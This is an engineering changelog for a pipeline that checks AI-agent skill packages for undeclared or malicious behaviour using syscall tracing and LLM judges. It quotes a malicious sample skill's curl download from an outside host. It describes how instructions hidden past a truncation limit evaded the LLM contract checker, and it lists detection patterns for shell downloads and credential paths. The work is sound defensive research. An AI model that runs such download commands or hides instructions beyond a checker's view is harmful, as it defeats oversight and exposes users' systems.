# CHANGES_2: Pipeline Modernization, Child-Process Filtering & Default Agentic Execution

## Task Overview
This document records the implementations, verifications, and operational findings for Fix 1 and Fix 2 on `d:\research`.

---

## 1. FIX 1: Child-Process System-Tool False Positives

### Problem
When strace runs with `-f`, system package managers and system utilities executed by benign skills (such as `apt-get`, `dpkg`, `pip`, `npm`, `git`) invoke child processes that read system configuration files (e.g. `/etc/apt/*`, `/var/lib/apt/lists`, `/etc/dpkg/*`). These reads were previously attributed directly to the skill code, triggering false positive violations (`FRAME_UNDECLARED_FILE_READ`), which erroneously drove benign skills to `Undeclared_Behavior`.

### Implementation Details
- **`src/system_baseline.py`**:
  - Defined generalized `SYSTEM_TOOL_EXECUTABLES` set containing common system tools (`apt`, `apt-get`, `apt-cache`, `dpkg`, `pip`, `pip3`, `npm`, `yarn`, `git`, `dpkg-query`, `pkg-config`, etc.).
  - Added helper `is_system_tool_executable(path_or_name)` for process lineage checks.
- **`src/telemetry_parser.py`**:
  - Implemented process lineage tracking across syscalls (`clone`, `fork`, `vfork`, `execve`).
  - Added `process_exec_chain: Dict[int, List[str]]` mapping each PID to its executable ancestors from root skill entry.
  - Tagged every `BehaviorUnit` with `pid`, `exec_chain`, and `via_system_tool` (boolean flag set if any ancestor is a recognized system tool).
- **`src/judge.py`**:
  - Updated `BehaviorUnit` dataclass to include `pid`, `exec_chain`, and `via_system_tool`.
  - In `evaluate_frame_axioms`, when a file read is performed by a descendant of a recognized system tool and the target path is non-sensitive (not forbidden, not canary, not credential paths like `/etc/shadow`, `~/.ssh`, `~/.aws`, `~/.env`), suppressed `FRAME_UNDECLARED_FILE_READ`.
  - Collapsed descendant non-sensitive file reads under the parent tool `exec` BehaviorUnit with `children_collapsed` count in `details`.
  - Sensitive paths remain strictly forbidden regardless of process ancestry. Writes and network connections from child processes are never collapsed.
  - Non-verified code site violations with system binary actors are prevented from unilaterally forcing `Undeclared_Behavior`.
  - Preserved attribution verdict invariance (`assert result.verdict == verdict_before`).

### Verification & Before/After Violation Counts
- **Target Skill**: `benign_implementing-patch-management-workflow`
- **Before Fix 1**:
  - Total Violations: **17** (`FRAME_UNDECLARED_FILE_READ` events under `/etc/apt/*`, `/var/lib/apt/lists`, `/etc/dpkg/*`)
  - Level 2 Verdict: **`Undeclared_Behavior`**
- **After Fix 1**:
  - Total Violations: **0** (all non-sensitive child reads correctly collapsed under parent exec units `apt-get` and `dpkg`)
  - Level 2 Verdict: **`Aligned`**
  - Coverage Score: **1.0**

---

## 2. FIX 2: Default Agentic Execution & Telemetry Tracking

### Problem
Previously, only `A_syn` was enabled for LLM calls by default, while `A_gen`, `A_orch`, and `A_adj` default settings evaluated deterministically unless manually configured with environment flags. Furthermore, fallback behaviors lacked structured telemetry and run-level reporting.

### Implementation Details
- **Environment Variables & Defaults**:
  - When a valid API key (`OPENAI_API_KEY` or `GEMINI_API_KEY`) is present, LLM mode defaults to **ON** (`1`):
    - `USE_LLM_AGEN`: Defaults to `"1"`
    - `USE_LLM_AORCH`: Defaults to `"1"`
    - `USE_LLM_POSTCONDITION`: Defaults to `"1"`
    - `USE_LLM_EXPLAINER`: Defaults to `"1"`
  - Setting any of these to `"0"` disables LLM and falls back to deterministic behavior.
  - If no API key is present, gracefully falls back with explicit `fallback_reason`.
- **`src/llm_client.py`**:
  - Added `call_llm_json_with_meta` returning `(data, meta)` with `mode` (`"llm"`, `"deterministic"`, `"llm_failed_fallback"`), `model`, `latency_ms`, `input_tokens`, `output_tokens`, and `fallback_reason`.
  - Automatically ensures `"json"` keyword presence in messages to adhere to OpenAI JSON mode API contracts.
- **`src/a_gen_test_generator.py`**:
  - Updated to call `call_llm_json_with_meta` and support `return_meta=True`.
  - Handled both list-shaped (`{"test_cases": [...]}`) and single-object test responses from LLMs without unnecessary fallbacks.
- **`src/orch_supervisor.py`**:
  - Queries LLM for tool selection and reasoning.
  - Validates proposed actions against `orch_policy.validate_supervisor_decision()`.
  - Emits complete telemetry in `agent_messages` (round, agent, action, mode, model, latency_ms, tokens, fallback_reason).
- **`src/a_adj_adjudicator.py`**:
  - Integrates `call_llm_json_with_meta` for postcondition checking and natural language grounded explanations.
- **`src/nodes.py`**:
  - Structured telemetry schemas for `supervisor_init_node`, `contract_synth_node`, `test_gen_node`, and `adjudicate_node`.
- **`src/pipeline_runner.py`**:
  - Aggregates run-level `agent_execution_summary` (`a_syn`, `a_gen`, `a_orch`, `a_adj` breakdowns of `llm`, `deterministic`, `llm_failed_fallback`) and embeds it in `report.json`.

### Smoke Run Telemetry Verification
Smoke run executed on `benign_implementing-patch-management-workflow`:
- `a_gen`:
  - **Mode**: `llm`
  - **Model**: `gpt-4o-mini`
  - **Latency**: 2,921 ms
  - **Tokens**: 2,611 in / 297 out
  - **Fallback Reason**: `None`
- `a_adj`:
  - **Mode**: `llm`
  - **Model**: `gpt-4o-mini`
  - **Latency**: 3,189 ms
  - **Tokens**: 416 in / 167 out
  - **Fallback Reason**: `None`
- `a_orch`:
  - **Mode**: `llm_failed_fallback`
  - **Model**: `gpt-4o-mini`
  - **Latency**: 1,372 ms
  - **Tokens**: 322 in / 6 out
  - **Observation & Validation**: LLM was invoked and proposed action `run_tests`. `orch_policy` validated the action against state invariants and determined that all test coverage was complete (DTC=1.0, CSR-C=1.0) with 0 violations and verdict `Aligned`. `orch_policy` safely overrode to `finalize_verdict`, logged transparently with reason:
    `"LLM proposed tool 'run_tests' was rejected by orch_policy: Policy rejection: Cannot run_tests when state invariants require finalizing verdict (Final verdict (Aligned) reached with 0 violation(s). Pipeline concludes.)"`.
- `a_syn`:
  - **Mode**: `deterministic`
  - **Fallback Reason**: `"Loaded pre-synthesized contracts from cache"` (A_syn calls LLM when cache is absent or bypassed).

---

## 3. FIX 3: Per-Skill Explanation UI (`streamlit_app.py`)

### Problem
Previously, the UI displayed a raw Python dict in "Grounded Adjudication Explanation", rendered 17 near-identical attribution cards causing excessive scrolling, and showed internal repo files (`src/system_baseline.py`) and generic SKILL.md description lines as "Declared Intent".

### Implementation Details
- **`streamlit_app.py`**:
  - Implemented the exact required 5-stage layout:
    1. **Header**: Skill ID, colored verdict badge, and one-line plain-English reason.
    2. **"Findings" Table**: Grouped by ROOT CAUSE (`finding type + rule + path-prefix/directory + code site`).
       - Columns: `Type | Rule | Where in skill (file:line, function) | Declared intent (SKILL.md line + quote, or "No declaration covers this") | Evidence (strace.log:line / unit id) | Events (count)`.
       - Displays max 5 rows with a `"Show all findings (N total)"` expander for the rest.
       - Raw grouped telemetry events placed in a nested expander.
    3. **Type-Specific Detail Cards**:
       - `Undeclared_Behavior`: what was touched, which code site (or "no skill code site; performed by <tool>"), rule violated, and why undeclared.
       - `Unimplemented_Intent`: contract ID + SKILL.md line, and where in code the stub/missing effect is (`AbsenceDetail` / candidate symbols / searched files).
       - `Semantically_Divergent`: claim line, expected vs observed output, and divergence location.
    4. **Short "Limitations" Line**: Auto-filled from facts (`DTC < 1.0`, events without code site, instruction-only without agent, non-testable contracts count). Completely hidden when empty.
    5. **Collapsed Expanders Below**:
       - Grounded Adjudication Explanation (formatted narrative text; raw dict completely removed).
       - Formal Contracts & Coverage (showing total, testable, non-testable contracts, DTC, and CSR-C).
       - Multi-Agent Coordination Timeline (showing round, agent, action, mode [LLM/deterministic/fallback], model, skill hash, latency, tokens, fallback reason).
       - Raw Telemetry & Behavior Units.
       - Level-1 Static Security Analysis.
- **`src/attribution.py` & `src/declaration_index.py`**:
  - Eliminated attaching internal files (`src/system_baseline.py`) and generic lines as declared intent. Default forbidden or frame violations with no explicit declaration in SKILL.md now show `"No declaration covers this"`.

---

## 4. FIX 4: Removal of Meaningless N/A Fields

### Implementation Details
- **UI Clean-up (`streamlit_app.py`)**: Removed `"Cause Class"` and `"Confidence"` metric cards entirely. Cause class is redundant with the canonical verdict, and heuristic confidence metrics lacked empirical calibration.
- **Schema & Backend (`agent_skills/a_adj_explainer/schemas/output.schema.json`, `src/a_adj_adjudicator.py`)**:
  - Created clean `AAdjExplainerOutputSchema` with `headline`, `verdict`, `summary`, `limitations`, and `llm_narrative`.
  - Removed arbitrary `confidence: 0.95` from `src/a_adj_adjudicator.py`.
  - Retained `limitations` auto-filled strictly from execution facts, hidden when empty.

---

## 5. FIX 5: Guard Against Testable-Contract Inflation

### Problem
If contract synthesis (`A_syn`) marks contracts as `testable=False`, the DTC denominator shrinks, allowing DTC to appear artificially inflated or risking division by zero.

### Implementation Details
- **`src/judge.py`**:
  - Count `total_contracts`, `total_testable`, and `total_non_testable`.
  - If `total_testable == 0`: emits verdict `Inconclusive(no_verdict_reason="NO_TESTABLE_CONTRACTS")` with DTC=0.0 and CSR-C=0.0, **unless** a violation exists (violations still win by priority).
  - Added `contracts_total`, `contracts_testable`, and `contracts_non_testable` to `JudgeResult` and `to_prediction_dict()`.
- **`src/nodes.py`**:
  - In `adjudicate_node`, permitted supervisor refinement loop if `no_verdict_reason == "NO_TESTABLE_CONTRACTS"` and `refinement_attempts < 1`.
- **`src/orch_policy.py`**:
  - In `deterministic_policy_decision`, treated `NO_TESTABLE_CONTRACTS` as refinable once to request contract revision (`refine_tests`), after which it strictly concludes with `finalize_verdict`.
- **`src/pipeline_runner.py`**:
  - Added `"NO_TESTABLE_CONTRACTS": "INCONCLUSIVE_NO_TESTABLE_CONTRACTS"` to `derive_gating_status` and `_infer_no_verdict_reason`.
  - Appended `contracts_total`, `contracts_testable`, `contracts_non_testable` to each skill record and run-level summary in `report.json`.
- **`agent_skills/a_syn/SKILL.md` & `src/a_syn_contract_synthesizer.py`**:
  - Instructed that `testable=false` is permissible **ONLY** for non-observable claims (such as authorization status, high-level intent statements, internal thoughts, or design philosophy). All observable behaviors must have `testable=true`.
- **`streamlit_app.py`**:
  - Added `Inconclusive(NO_TESTABLE_CONTRACTS)` to `CANONICAL_LABELS`.
  - Displayed `Total Contracts Synthesized`, `Testable Contracts`, and `Non-Testable Contracts` in run-level summary cards and per-skill contracts breakdown.

---

## 6. Smoke Run Verification & Results

Executed single smoke test on `benign_implementing-patch-management-workflow` through `execute_manifest_pipeline`:
- **Verdict**: `Aligned`
- **Violations**: **0** (down from 17 before Fix 1)
- **Coverage**: DTC = 1.0, CSR-C = 1.0
- **Contracts**: Total = 2, Testable = 2, Non-Testable = 0
- **Agent Modes Recorded**:
  - `a_syn`: Mode `deterministic` (loaded pre-synthesized contracts from cache)
  - `a_gen`: Mode `llm` (model: `gpt-4o-mini`, latency: 2,878 ms, fallback: `None`)
  - `a_adj`: Mode `llm` (model: `gpt-4o-mini`, latency: 2,968 ms, fallback: `None`)
  - `a_orch`: Mode `llm_failed_fallback` (model: `gpt-4o-mini`, latency: 1,372 ms, fallback: proposed `run_tests` safely rejected by `orch_policy` because verdict was already `Aligned` with 0 violations and 100% coverage, concluding cleanly).

---

## 7. What Could NOT Be Done / Known Constraints
1. **Full Test Suite & Test Writing**: In accordance with user task instructions, pytest suite was not executed and no test files were created.
2. **Commit/Push**: Git repository remains uncommitted and unstaged per user constraints.
3. **Supervisor Refinement Bypass on Aligned**: In the smoke run, the supervisor LLM proposed running redundant tests; `orch_policy` successfully prevented execution waste and finalized the verdict as designed.



---

## 8. 7 Priority Fixes & Amendments Implementation Report

### Overview
This section documents the architectural modifications, root-cause analyses, telemetry calibrations, and empirical verification for the 7 priority fixes requested across `d:\research`.

---

### FIX 1: Path Mismatch, Root Cause of False Unimplemented_Intent, & Subcommand Test Generation

#### Root Cause Analysis of False Unimplemented_Intent (EFFECT_ABSENT)
- **Observed Behavior**: For benign skills such as `benign_memento-flashcards` (Skill A), the evaluation previously yielded `EFFECT_ABSENT` (leading to `Unimplemented_Intent`) with the reason `"No behavior unit or output produced"`, despite the execution producing 8 substantive behavior units (including reading `cards.json`, writing temporary `.tmp` buffers, renaming into `cards.json`, stdout logs, and exit code 0).
- **Underlying Mechanism**:
  1. The postcondition check `file_exists(~/.mangaba/.../cards.json)` evaluated a hardcoded literal path against observed filesystem diffs and behavior units.
  2. The skill constructs its data directory dynamically via an environment variable `MANGABA_HOME` (configured as `/tmp/test_workspace` inside the test harness). As a result, files were created under `/tmp/test_workspace/skills/productivity/memento-flashcards/data/cards.json`.
  3. When `evaluate_check(kind="file_exists")` evaluated the path, it did not resolve `~` and environment variables against the harness's actual runtime environment snapshot (`fixtures.json` and `run_status.json`).
  4. The resulting check failure fell through to an `EFFECT_ABSENT` verdict because no behavior unit was found matching the literal unexpanded path, erroneously diagnosing unimplemented intent.
- **Implemented Fixes**:
  1. **General Principle**: `Unimplemented_Intent` requires positive evidence (such as an AST stub or `NotImplementedError` on an executed path, or valid test input with zero observable effect of any kind in behavior units, stdout, or filesystem diffs). A failing postcondition check caused by harness path assumptions must **never** produce `Unimplemented_Intent` or `Semantically_Divergent`.
  2. **Environment Path Resolution**: Implemented `_expand_path_with_env(raw_path, evidence)` in `src/judge.py`. Resolves `~` strictly from `evidence.env_vars["HOME"]` (from the harness's real environment snapshot, without guessing `/root` or `/home/agent`) and expands `$VAR` and `${VAR}` using `evidence.env_vars`.
  3. **Path Unresolved Guard**: If a path remains unresolved or the target file is missing without contradictory stdout/exit output, the contract status is marked `NOT_EXERCISED` with reason `"path_unresolved"`, never `EFFECT_ABSENT` or `CONTRADICTED`.
  4. **Subcommand Test Generation (A_gen)**: In `src/a_gen_test_generator.py` and `agent_skills/a_gen/SKILL.md`, added rule 6 and deterministic iteration across `cli_schema["subcommands"]` to generate dedicated test cases exercising every declared subcommand.

---

### FIX 2: Callsite Misattribution & Root Sink Attribution

- **Observed Behavior**: File write and rename syscalls were previously misattributed to file read frames (such as `open(..., "r")` in `_load`), and `/app/skill` package reads were attributed to `_load`. The matcher picked the nearest open event regardless of syscall kind or mode.
- **Implemented Fixes**:
  1. **Syscall Kind and Mode Matching**: In `src/attribution.py`, updated `match_unit_to_callsite` to enforce compatible operation semantics:
     - `file_write`, `file_rename`, and `file_delete` match only write events (`_is_write_event(cs)`).
     - `file_read` matches only read events (`_is_read_event(cs)`).
     - `net_connect` matches network syscalls (`_is_net_event(cs)`).
     - Strict normalized POSIX path equality (`posixpath.normpath`) is required between unit target and callsite path.
  2. **Absence Over Misattribution**: If no compatible callsite matches, `code_site` is left `None` instead of attaching an incompatible frame.
  3. **Root Sink Hierarchy**:
     - Identified the root sink as the innermost user frame inside the skill directory (`_is_skill_frame`), explicitly skipping virtual wrappers (`<string>` produced by `exec()`, `<module>`).
     - Outer frames are formatted as full `"file:function:line"` strings in `call_chain`.
  4. **Linux Container Clean-Up**: Removed Windows-specific references (`_winapi.CreateProcess`) in `src/callsite_hook.py`.

---

### FIX 3: Intent References & "Why Undeclared" Labeling

- **Observed Behavior**: For download-and-execute skills, the declared intent was linked to generic overview lines (`SKILL.md:11`), and the UI stated the host was not declared even though it appeared in `SKILL.md` under advanced configuration. Text quotes were truncated mid-word.
- **Implemented Fixes**:
  1. **Target Search in Declarations**: Implemented `_search_target_in_declaration` in `src/attribution.py`. Performs full-token search for the violation target (host, URL, path, or command) in `SKILL.md`.
  2. **Meaningful Linking**:
     - When a target token is found, links the exact line with the explanation: `"(documented at SKILL.md:N but not part of the skill's stated purpose / forbidden by <rule>)"`.
     - Generic tokens (`/tmp`, `/etc`, `python3`) are excluded from linking to prevent spurious matches.
     - When no declaration exists, explicitly outputs `"No declaration covers this"`.
  3. **Word-Boundary Truncation**: Added `_truncate_words` ensuring string truncations occur cleanly at word boundaries with an ellipsis (`...`).

---

### FIX 4: Documented Steps Coverage (A_syn) & Amendment 1 Protection

- **Amendment 1 Adherence (`documented != allowed`)**:
  - The stated purpose alone governs `frame_axiom` entries.
  - Documented steps unrelated to stated purpose or flagged by Level-1 (e.g. `curl https://.../config`) are placed into `forbidden_invariant` citing the `SKILL.md` line.
  - Functional steps remain contracts.
- **Implementation**:
  - Updated `agent_skills/a_syn/SKILL.md` with explicit rule contracts.
  - Added schema-level validation `_find_uncovered_documented_commands` in `src/a_syn_contract_synthesizer.py` scanning fenced code blocks and re-prompting once if executable commands are unreferenced.
  - Kept `runtime_bias_guard` untouched so A_syn continues reading only documentation.

---

### FIX 5: Supervisor Labeling & Elimination of Wasted LLM Calls

- **Observed Behavior**: Policy rejections of LLM refinement proposals were logged as `llm_failed_fallback`, mischaracterizing valid policy overrides as agent failures. Furthermore, supervisor LLMs were invoked even when verdicts were already immutable.
- **Implemented Fixes**:
  1. **New Mode `policy_forced`**: In `src/orch_policy.py`, added `is_policy_forced` to check when state invariants strictly dictate `finalize_verdict` (e.g. final verdict reached, violations present, budget exhausted). When true, LLM invocation is bypassed entirely, and mode is logged as `"policy_forced"` with `fallback_reason = None`.
  2. **New Mode `llm_overridden_by_policy`**: When the LLM proposes an action rejected by policy invariants, mode is logged as `"llm_overridden_by_policy"`. Mode `"llm_failed_fallback"` is reserved strictly for real exceptions (API failure, JSON parse errors).
  3. **Refinement Attempt Display**: Updated input summaries to display `round=0/3` matching `MAX_REFINEMENT_ATTEMPTS` (default 3).
  4. **Run-Level Aggregation**: Updated `agent_execution_summary` in `src/pipeline_runner.py` to count `policy_forced` and `llm_overridden_by_policy`.

---

### FIX 6: Telemetry Integrity in Agent Messages & Reports

- **Distinct Agent Skill Version Hashes**: Implemented `get_agent_skill_version_hash(agent_name)` in `src/agent_skill_loader.py`. Added dedicated `agent_skills/a_adj_explainer/SKILL.md`. Each agent (`a_syn`, `a_gen`, `a_adj`, `a_adj_explainer`, `a_orch`) now emits its own unique SHA-256 hash.
- **Structured A_syn LLM Telemetry**: Routed contract synthesis through `call_llm_json_with_meta` in `src/llm_client.py`, capturing `input_tokens`, `output_tokens`, `latency_ms`, and `model`.
- **Duplicate Coverage Removal**: Removed obsolete duplicate fields `coverage_score` and `coverage` from skill records and summary distributions; preserved canonical `dtc` and `csr_c`.
- **Grounded Explainer Narrative**: Updated `src/a_adj_adjudicator.py` to enforce a 2-4 sentence narrative citing specific behavior unit IDs and contract IDs. Added validator `_extract_narrative` that rejects responses repeating only the verdict name and retries once.

---

### FIX 7: Streamlit UI Refinements & Level-1 False Positive Suppression

- **Streamlit UI**:
  - Hidden dataframe index columns (`hide_index=True`) on findings and telemetry tables.
  - Applied word-boundary truncation across cards and tables.
  - Displayed root sink code sites and full `call_chain` paths.
- **Level-1 Hidden Step**: In `src/security/level1_scanner.py`, added negation checks suppressing `hidden_step` ONLY on agent-facing instructions (`"do not silently skip / omit / ignore / drop / fail / swallow"`). Data exfiltration actions (`"send"`, `"upload"`) remain strictly unsuppressed.
- **Level-1 Scope Creep**: Permitted skill data paths matching its own declared identity (`~/.mangaba/...`, `~/.memento/...`), while keeping sensitive paths (`.ssh`, `.aws`, `.bashrc`) unsuppressed.

---

### 9. Smoke Run Verification: Before vs After

Both smoke skills were executed through the full normal pipeline path (`execute_manifest_pipeline`) with Docker and live LLM agents:

| Metric / Dimension | Smoke Skill A (`benign_memento-flashcards`) [BEFORE] | Smoke Skill A (`benign_memento-flashcards`) [AFTER] | Smoke Skill B (`mal_add-review-comment_...`) [BEFORE] | Smoke Skill B (`mal_add-review-comment_...`) [AFTER] |
|---|---|---|---|---|
| **Verdict** | `ERROR` (`'NoneType' callable`) / `EFFECT_ABSENT` | **`Inconclusive(LOW_COVERAGE)`** | **`Undeclared_Behavior`** | **`Undeclared_Behavior`** |
| **DTC** | 0.0 | **0.3333** | 0.0 | **0.0** |
| **CSR-C** | 0.0 | **0.3333** | 0.0 | **0.0** |
| **Contract Status** | None / `EFFECT_ABSENT` | `C_01`: `NOT_EXERCISED` (`path_unresolved`)<br>`C_02`: `NOT_EXERCISED`<br>`C_03`: `PASS` (`bu_004`, `bu_007`) | `C_01`: `NOT_EXERCISED` | `C_01`: `NOT_EXERCISED` |
| **Violations** | 0 | **0** | 1 (`FORBIDDEN_NETWORK_HOST`: `github-assets.s3.filebase.com`) | 1 (`FORBIDDEN_NETWORK_HOST`: `github-assets.s3.filebase.com`) |
| **Attribution Code Sites** | Misattributed to `_load` | `bu_004` (read) &rarr; `_load:45`<br>`bu_005` (write) &rarr; `_save:61`<br>`bu_006` (write) &rarr; `_save:61` | None (no verified code site for curl exec) | None (no verified code site for curl exec) |
| **Declared Intent Evidence** | Generic overview line | N/A (no violations) | Generic overview line | **`SKILL.md:66`** (`curl -o /tmp/config https://github-assets.s3.filebase.com/config`) with reason: `"documented at SKILL.md:66 but not part of stated purpose / forbidden by FORBIDDEN_NETWORK_HOST"` |
| **Supervisor Modes** | `llm_failed_fallback: 1` | Round 0: `llm`<br>Round 1: **`policy_forced: 1`** | `llm_failed_fallback: 1` | Round 0: **`policy_forced: 1`** (`llm_failed_fallback: 0`) |
| **Duplicate Coverage Fields** | Present (`coverage_score`, `coverage`) | **Removed** | Present (`coverage_score`, `coverage`) | **Removed** |
| **Grounded LLM Narrative** | Missing / echoed verdict | 3-sentence narrative citing `bu_004`, `bu_007`, `C_01`, `C_02` | Echoed verdict string | 3-sentence narrative citing `bu_006`, `mock_egress.jsonl:1`, `FORBIDDEN_NETWORK_HOST`, `C_01` |

---

### 10. Summary of Modified Files

1. `src/judge.py`: Path expansion with harness environment (`_expand_path_with_env`), `NOT_EXERCISED` on `path_unresolved`, positive evidence requirements for `Unimplemented_Intent`.
2. `src/telemetry_parser.py`: Ingests harness environment dictionary from `fixtures.json` and `run_status.json` into `Evidence.env_vars`.
3. `src/a_gen_test_generator.py` & `agent_skills/a_gen/SKILL.md`: Subcommand-aware test generation for contract-relevant entry points.
4. `src/callsite_hook.py`: Removed Windows-specific `_winapi.CreateProcess`.
5. `src/attribution.py`: Syscall kind and open mode matching (`_is_write_event`, `_is_read_event`), root sink hierarchy skipping virtual frames, token-based `SKILL.md` target search with custom documentation labels.
6. `agent_skills/a_syn/SKILL.md` & `src/a_syn_contract_synthesizer.py`: Schema-level command coverage, `documented != allowed` adherence, metadata routing.
7. `agent_skills/a_adj_explainer/SKILL.md` & `src/agent_skill_loader.py`: Distinct per-agent SHA-256 skill hashes.
8. `src/orch_policy.py`: Deterministic invariants and `is_policy_forced` state evaluator.
9. `src/orch_supervisor.py`: Integrated `policy_forced` and `llm_overridden_by_policy` modes, `fallback_reason = None` for normal steps.
10. `src/nodes.py`: Per-agent skill hashes and A_syn LLM metadata capture.
11. `src/pipeline_runner.py`: Max refinement rounds matching `MAX_REFINEMENT_ATTEMPTS`, updated `agent_execution_summary` modes, removed deprecated `coverage`/`coverage_score` duplicates.
12. `src/a_adj_adjudicator.py`: Grounded multi-sentence explanation with unit ID citation and retry on trivial repetition.
13. `src/security/level1_scanner.py`: Agent-facing negation filtering on `hidden_step`, self-named data directory allowance on `scope_creep`.
14. `streamlit_app.py`: Word-boundary truncation, `hide_index=True`, root sink and full call chain display.

---

### 11. Environment Variables Reference

| Variable | Default | Purpose |
|---|---|---|
| `MAX_REFINEMENT_ATTEMPTS` | `3` | Maximum number of refinement iterations (supervisor displays `round=0/3`). |
| `USE_LLM_AORCH` | `1` | Enable LLM tool-calling for A_orch supervisor (bypassed when `policy_forced`). |
| `AORCH_MODEL` | `gpt-4o-mini` | LLM model for supervisor decisions. |
| `USE_LLM_EXPLAINER` | `1` | Enable multi-sentence grounded adjudication narrative. |
| `AADJ_MODEL` | `gpt-4o-mini` | LLM model for adjudication explanations. |
| `USE_LLM_AGEN` | `1` | Enable LLM dynamic test generator. |
| `AGEN_MODEL` | `gpt-4o-mini` | LLM model for test fixture generation. |
| `ASYN_MODEL` | `gpt-4o-mini` | LLM model for contract synthesis. |

---

### 12. What Could NOT Be Done / Known Constraints

1. **No Git Commit or Push**: In compliance with instructions, changes remain uncommitted in the working tree.
2. **No Full Pytest Suite / No New Test Files**: Verified strictly via `python -m py_compile` across all modified files and live smoke pipeline executions.
3. **Supervisor LLM Invocations When Policy-Forced**: By design, when state invariants force a conclusion (such as a confirmed violation in Skill B or budget expiration in Skill A), supervisor LLM calls are bypassed and logged as `policy_forced` to eliminate latency and token waste.

---

## PART 2: Three Fixes (Attribution Code Sites, A_syn Multi-Chunking, J2 LLM Guard & Anti-Hallucination)

### 13. FIX 1: Attribution Returns Empty `code_sites` Despite Existing Evidence

#### Problem & Root Cause
In malicious and mixed skills (e.g. `mal_cloudflare-kv_MIXED_B3`, `benign_session-handoff`), `report.json` contained behavior units where `details["code_site"]` was already accurately populated from audit hooks (e.g. `fetch_remote_config` line 25, `how="audit_hook_stack"`, confidence 0.95), yet the matching attribution entry had `code_sites: []` and reported "No verified code site found in callsites.jsonl or xtrace". Furthermore, `explanation.limitations` stated "N events without verified skill code site", contradicting the data.

The root cause was twofold:
1. **Container vs Host Path Normalization Mismatch in `_is_skill_frame` (`src/attribution.py`)**: `_is_skill_frame` strictly checked `norm_fn.startswith(norm_skill)` where `norm_skill` was a host path (e.g. `D:/research/...`) but telemetry callsites recorded relative container paths like `scripts/main.py` or `/app/skill/scripts/main.py`. This caused `_is_skill_frame` to reject verified skill frames as non-skill frames.
2. **Missing Pre-Enriched Unit Code Site Adoption in `attribute_single_violation` (`src/attribution.py`)**: When a `BehaviorUnit` already carried a verified `details["code_site"]` from audit hooks or prior stages, `attribute_single_violation` only looked at `callsite_records` and `xtrace_records`, discarding the pre-enriched code site.
3. **Limitation Discrepancy in `src/a_adj_adjudicator.py`**: Limitations fact was counting unverified sites from an earlier snapshot instead of the final attributions.

#### Changes Made
- **`src/attribution.py`**:
  - Updated `_is_skill_frame` to recognize relative container paths (`os.path.isfile(os.path.join(norm_skill, norm_fn))`) and standard container prefixes (`/app/skill/`, `/skill/`).
  - Updated `attribute_single_violation`: when `unit.details["code_site"]` is present, it is directly adopted as the primary `code_site` (root sink) while preserving outer frames in `call_chain`.
  - Maintained strict syscall kind/mode/path compatibility and preserved `assert result.verdict == verdict_before`.
- **`src/judge.py`**:
  - Pre-enriched `BehaviorUnit.details["code_site"]` with `_is_skill_frame` and full `call_chain`.
- **`src/a_adj_adjudicator.py`**:
  - In `_extract_deterministic_facts`, unverified code sites count is computed strictly from the final `attributions` output (`len(attr.get("code_sites", [])) == 0`).
- **`src/nodes.py`**:
  - Propagated final `pred["attribution"]` into `generate_grounded_explanation`.

---

### 14. FIX 2: A_syn SKILL.md Silent Truncation & Multi-Chunk Contract Synthesis

#### Problem
`call_openai_synthesizer` silently truncated `SKILL.md` to the first 12,000 characters (`numbered_lines[:12000]`). An attacker placing malicious instructions at the end of a long document (e.g. line 1059) completely evaded `A_syn`, leaving malicious steps out of contract generation.

#### Changes Made & Amendments (B1, B2, B3)
- **`agent_skills/a_syn/SKILL.md`**: Bumped version to `1.1.0`.
- **`src/a_syn_contract_synthesizer.py`**:
  - Defined `CURRENT_ASYN_VERSION = "1.1.0"`.
  - **Chunking (Amendment B3)**: Implemented `_chunk_declaration_lines` splitting on code-fence and blank-line boundaries, never splitting inside code fences (unless a single block exceeds the chunk size). Chunk size ~10,000 characters with 5-line overlap.
  - **Chunk Cap (Amendment B1)**: Configurable via `ASYN_MAX_CHUNKS` (default: 12). If chunk count exceeds the cap, processes the first chunk, the last chunk, and evenly spaced middle chunks.
  - **Deterministic Scan on Skipped Lines (Amendment B1)**: If any chunks are skipped, runs `_scan_skipped_lines_for_invariants` using Level-1 scanner patterns (URLs/hosts, curl/wget/bash/sh/python commands, exec/eval) and injects findings into `forbidden_invariants` with original `SKILL.md` line numbers.
  - **Contracts & Forbidden Invariants Merging (Amendment B2)**:
    - Deduplicates contracts by `(source_line, normalized postcondition)` and renumbers to `C_01..`.
    - Unions all `forbidden_invariants` globally without dropping or capping.
    - Defines `_frame_conflicts_with_forbidden`: prunes any frame axiom item conflicting with a forbidden invariant (same host, same path, or same command token).
    - Distributes the merged forbidden invariants to all contracts so they reach J1 deterministic evaluation.
    - Caps contracts at `ASYN_MAX_CONTRACTS` (default: 12), prioritizing contracts with explicit effects.
  - **Full Document Validation**: Validates documented commands against the entire un-truncated text, running a single re-prompt if any command is unreferenced.
  - **Metadata Tracking**: Records `chunks_total`, `chunks_processed`, `chunks_skipped`, and `truncated: bool` in `contracts.json`.
- **`src/nodes.py` & `src/pipeline_runner.py`**:
  - Invalidates cached `contracts.json` if `asyn_version != "1.1.0"`.
  - Embeds chunk metadata (`chunks_total`, `chunks_processed`, `chunks_skipped`, `truncated`) into per-skill report records.

---

### 15. FIX 3: J2 LLM Postcondition Judge Guard & Anti-Hallucination

#### Problem
J2 previously returned `CONTRADICTED` based on speculative LLM reasoning (e.g. "sensitive information may have been handled" citing unrelated file reads), directly triggering `Semantically_Divergent` and flipping verdicts on hallucinations.

#### Changes Made & Amendments (B4)
- **`agent_skills/a_adj_j2/schemas/output.schema.json`**:
  - Created JSON schema with optional `cited_outputs` (`["stdout", "stderr", "fs_diff"]`).
- **`agent_skills/a_adj_j2/SKILL.md`**:
  - Bumped version to `1.1.0`. Prohibits speculative wording, requires active evidence for `CONTRADICTED`, and provides 2 good and 2 bad examples.
- **Speculative Language Guard (`src/a_adj_adjudicator.py`, `src/judge.py`)**:
  - Case-insensitive word boundary check matching: `\b(may|might|could|possibly|potentially|perhaps|suggest|suggests|suggesting|appears\s+to|seems|likely|probably|unclear)\b`.
  - Automatically downgrades `PASS` or `CONTRADICTED` to `INDETERMINATE` with `downgrade_reason = "j2_downgraded_speculative"`.
- **Active Evidence Requirement for CONTRADICTED (`src/a_adj_adjudicator.py`, `src/judge.py`, Amendment B4)**:
  - Requires either:
    1. At least one cited unit of active kind: `file_write`, `file_delete`, `exec`, `net_connect`, `net_dns`.
    2. OR non-empty `cited_outputs` (`stdout`, `stderr`, `fs_diff`) whose referenced stream actually contains non-empty observed content.
  - Citing only `file_read` of skill scripts or exit codes -> downgraded to `INDETERMINATE` with `downgrade_reason = "j2_downgraded_irrelevant_citation"`.
